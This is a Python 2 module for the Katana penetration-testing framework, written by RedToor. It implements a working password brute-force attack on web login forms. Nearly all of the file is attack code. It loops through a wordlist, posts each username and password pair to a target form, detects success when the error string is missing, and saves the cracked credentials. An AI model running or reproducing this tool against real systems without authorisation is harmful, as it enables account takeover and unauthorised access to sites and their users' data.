# This module requires katana framework 
# https://github.com/RedToor/Katana
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core.Setting import *    #
from core import Errors       #
from core import getFunction  #
import sys                    #
Message=DESIGN()              #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import httplib,urllib         #
import socket                 #
import sys                    #
import time                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

# INFORMATION MODULE
def initialize():
	initialize.Author             ="RedToor"
	initialize.Version            ="1.1"
	initialize.Despcription       ="Brute Force to Form-based in Webs application."
	initialize.CodeName           ="web/bt.form"
	initialize.DateCreation       ="28/02/2015"      
	initialize.LastModification   ="24/03/2016"

	# DEFAULT VARIABLES             VALUE                  NAME        RQ     DESCRIPTION
	initialize.DEFAULT_VARIABLE   =[[LOCAL_IP            , "target" , "yes" , "IP or DNS"]]         #[0][0]
	initialize.DEFAULT_VARIABLE  +=[[HTTP_PORT           , "port"   , "no"  , "Service port"]]      #[1][0]
	initialize.DEFAULT_VARIABLE  +=[["/KatanaLAB/run.php", "patch"  , "yes" , "File patch"]]        #[2][0]
	initialize.DEFAULT_VARIABLE  +=[[USERNAME            , "user"   , "yes" , "Username target"]]   #[3][0]
	initialize.DEFAULT_VARIABLE  +=[[DITIONARY_PASSWORDS , "dict"   , "no"  , "Wordlist"]]          #[4][0]
	initialize.DEFAULT_VARIABLE  +=[["administrator"     , "data_a" , "yes" , "Name value 1"]]      #[5][0]
	initialize.DEFAULT_VARIABLE  +=[["password"          , "data_b" , "yes" , "Name value 2"]]      #[6][0]
	initialize.DEFAULT_VARIABLE  +=[["POST"              , "method" , "yes" , "Method form"]]       #[7][0]
	initialize.DEFAULT_VARIABLE  +=[["Wrong"             , "alert"  , "yes" , "error login"]]       #[8][0]
initialize()
# END INFORMATION MODULE

# MAIN FUNCTION
def main(run):
	try:
		# HEAD MODULE
		if run:	actions=raw_input(Message.prompt(initialize.CodeName))
		else  : actions="run"
		if   getFunction.KatanaCheckActionShowOptions(actions):getFunction.ShowOptions(initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionSetValue(actions)   :initialize.DEFAULT_VARIABLE=getFunction.UpdateValue(actions,initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionisBack(actions)     :return
		# END HEAD MODULE
		elif getFunction.runModule(actions):
			Message.run()
			# CODE MODULE    ############################################################################################
			try:
				getFunction.live(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
				if True:
					try:
						Message.loading_file()
						with open(initialize.DEFAULT_VARIABLE[4][0],'r') as passwords:
							for password in passwords:
								password=password.replace("\n","")
								params = urllib.urlencode({initialize.DEFAULT_VARIABLE[5][0]: initialize.DEFAULT_VARIABLE[3][0], initialize.DEFAULT_VARIABLE[6][0]: password})
								header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
								conn = httplib.HTTPConnection(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
								conn.request(initialize.DEFAULT_VARIABLE[7][0], initialize.DEFAULT_VARIABLE[2][0], params, header)
								response = conn.getresponse()
								ver_source = response.read()
								if ver_source.find(initialize.DEFAULT_VARIABLE[8][0]) <= 0:
									getFunction.savefour("BruteForceFormBase",initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0],initialize.DEFAULT_VARIABLE[2][0],initialize.DEFAULT_VARIABLE[7][0],initialize.DEFAULT_VARIABLE[5][0],initialize.DEFAULT_VARIABLE[6][0],initialize.DEFAULT_VARIABLE[3][0],password)
									print "\n-"+Suf+" Successfully with ["+initialize.DEFAULT_VARIABLE[5][0]+"="+initialize.DEFAULT_VARIABLE[3][0]+"]["+initialize.DEFAULT_VARIABLE[6][0]+"="+password+"]\n"
									main(True)
								else:
									print " "+Alr+" Checking ("+initialize.DEFAULT_VARIABLE[6][0]+"="+initialize.DEFAULT_VARIABLE[3][0]+")("+initialize.DEFAULT_VARIABLE[7][0]+"="+password+")"
					except:
						Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[4][0])
			except:
				Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[0][0]+":"+initialize.DEFAULT_VARIABLE[1][0])
			# END CODE MODULE ############################################################################################
		else:
			getFunction.KatanaCheckActionGlobalCommands(actions)
	# ERROR GENERAL
	except:
		Errors.Errors(event=sys.exc_info(), info=sys.exc_traceback.tb_lineno)
	# END ERROR GENERAL
	main(True)
# END MAIN FUNCTION

# LINKER FUNCTION
def run(target,port,patch,para1,valor,para2,dictionary,method,condition):
	initialize.DEFAULT_VARIABLE [0][0] = target
	initialize.DEFAULT_VARIABLE [1][0] = port
	initialize.DEFAULT_VARIABLE [2][0] = patch
	initialize.DEFAULT_VARIABLE [3][0] = valor
	initialize.DEFAULT_VARIABLE [4][0] = dictionary
	initialize.DEFAULT_VARIABLE [5][0] = para1
	initialize.DEFAULT_VARIABLE [6][0] = para2
	initialize.DEFAULT_VARIABLE [7][0] = method
	initialize.DEFAULT_VARIABLE [8][0] = condition
	main(False)
# END LINKER FUNCTION